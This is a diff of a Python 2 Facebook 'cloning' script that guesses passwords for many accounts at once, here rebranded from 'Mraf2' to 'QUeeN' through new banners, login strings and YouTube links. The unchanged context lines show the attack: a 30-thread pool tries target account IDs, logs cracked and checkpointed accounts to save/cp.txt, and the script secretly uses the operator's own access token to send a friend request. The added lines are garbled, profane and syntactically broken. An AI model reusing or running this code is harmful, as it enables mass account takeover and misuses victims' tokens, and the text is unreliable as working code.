@@ -45,16 +45,16 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(00000.1)
 
-
 ##### LOGO #####
 logo = """
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
-\033[1;96m        ╭━╮╭━╮╱╱╭━━━╮╭━┳━━━╮
-\033[1;96m        ┃┃╰╯┃┃╱╱┃╭━╮┃┃╭┫╭━╮┃ ⚡
-\033[1;96m        ┃╭╮╭╮┣━╮ ┃┃╱┃┣╯╰╋╯╭╯┃ 
-\033[1;96m        ┃┃┃┃┃┃╭╯ ┃╰━╯┣╮╭╋━╯╭╯ 
-\033[1;96m        ┃┃┃┃┃┃┃╱┃╭━╮┃┃┃┃┃╰━╮
-\033[1;96m        ╰╯╰╯╰┻╯╱╰╯╱╰╯╰╯╰━━━╯ Mraf2 Updated 0.2                   
+\033[1;96m       
+
+\033[1;96m        ⚡S̷e̷x̷y̷ Q̷U̷e̷e̷N̷
+\033[1;96m        fuck you hatters feel the power of QUeeN
+\033[1;96m         fuck fb systm
+\033[1;96m        
+\033[1;96m   QUeeN  Updated 0.2                   
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
 """
 def tik():
@@ -75,35 +75,31 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-\033[1;97m      ░█████╗░███████╗██████╗░    
-\033[1;92m      ██╔══██╗██╔════╝╚════██╗ Updated✔ 
-\033[1;97m      ███████║█████╗░░░░███╔═╝    
-\033[1;92m      ██╔══██║██╔══╝░░██╔══╝░░    
-\033[1;92m      ██║░░██║██║░░░░░███████╗
-\033[1;97m      ╚═╝░░╚═╝╚═╝░░░░░╚══════╝
-                                                               
+\033[1;97m      t🇸🇪🇽🇾 🇶🇺🇪🇪🇳 shaista Hayan
 
-"""
+                        lovely QUeeN shock the system                                       
 
-jalan("\033[1;97m•◈•───────•◈ NOT A NAME ITS BRAND •◈•───────•◈•")  
+"""now ohh my god 🙏 know system showing error ohh system hacked seucessfully
 
+jalan("\033[1;97m•◈•───────•◈ QUeeN  NOT A NAME ITS BRAND hacker ki jan •◈•───────•◈•")  
+love you my Cute QUeeN
 
 jalan("\033[1;96m•◈• ███████╗░█████╗░░██████╗████████╗ ")
 jalan("\033[1;96m•◈• ██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ")
 jalan("\033[1;97m•◈• █████╗░░███████║╚█████╗░░░░██║░░░ ")
 jalan("\033[1;96m•◈• ██╔══╝░░██╔══██║░╚═══██╗░░░██║░░░ ")
 jalan("\033[1;96m•◈• ██║░░░░░██║░░██║██████╔╝░░░██║░░░ ")
-jalan("\033[1;96m•◈• ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░ ")
+jalan("\033[1;96m•◈• 🅵🅰🆂🆃 🅷🅾🆃 🆀🆄🅴🅴🅽 🆂🅰🆈🆂 🅸 🆃🅷🅰🆃 🅳🅴🆅🅴🅻🅾🅿🅼🅴🅽🆃 🅻🅰🆃🅴🆂🆃 🅲🅾🅼🅽🅳🆉 🅼🆈 🅰🅻🅻 🅻🅾🆅🅴🅻🆈 🅵🅾🆁 🆈🅾🆄 🅵🆁🅸🅴🅽🅳🆂
  
 jalan("   \033[1;91m INDAIN USERZ USE ANY PROXY ")	
 jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	
 
-jalan("   \033[1;93m Welcome to Af2  Creations ")
+jalan("   \033[1;93m Welcome to QUeeN 👑   Creations ")
 
-jalan("\033[1;97m•◈•──────────•◈•\033[1;96mTheAfgVirus\033[1;96m•◈•──────────•◈•")
+jalan("\033[1;97m•◈•──────────•◈•\033[1;96mThe queen hacker maset in EthicalHacking\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "af2"
-CorrectPassword = "af2"
+CorrectUsername = "tech"
+CorrectPassword = "queen"
 
 
 loop = 'true'
@@ -116,10 +112,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
+            os.system('xdg-open https://m.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
+        os.system('xdg-open https://m.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 
 def login():
 	os.system('clear')
@@ -163,7 +159,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
+				os.system('xdg-open https://m.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -216,7 +212,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Mraf2"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update queen tools "																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -323,7 +319,7 @@ def pilih_super():
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"
 
-	jalan('                    \033[1;97mMr Af2 start cloning Wait...')
+	jalan('                    \033[1;97mQuern say please satrt faster clong comndz ever start cloning Wait...')
 	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
 
 	def main(arg):
@@ -439,10 +435,10 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id) 
 	
-	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;97m....'
+	print '\033[1;31;40m[✓] Process Has Been Completed QUeeN says thanks for usein my comndz\033[1;97m....'
 	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
 	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
-	print """
+	print """love you all
 \033[1;31;40m ●════════════════════════◄►════════════════════════●
            """
 	raw_input("\n\033[1;97m[\033[1;97mExit\033[1;97m]")
